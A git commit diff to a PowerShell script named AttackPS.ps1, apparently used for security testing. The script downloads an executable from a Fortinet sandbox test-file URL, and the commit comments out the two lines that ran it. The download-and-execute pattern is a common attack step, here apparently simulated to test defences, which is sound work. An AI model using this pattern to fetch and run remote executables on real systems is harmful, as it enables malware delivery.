52f68366530963ed5c4891c54740553552141464
Alberto <alberto.briano@outlook.com>
2026-06-15 22:55:27 +0200

    test download without payload execution

--- Windows/AttackPS.ps1
+++ Windows/AttackPS.ps1
@@ -3,5 +3,5 @@ $down = New-Object System.Net.WebClient
 $url = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
 $file = 'windows.exe';
 $down.DownloadFile($url,$file);
-$exec = New-Object -com shell.application
-$exec.shellexecute($file);
+#$exec = New-Object -com shell.application
+#$exec.shellexecute($file);
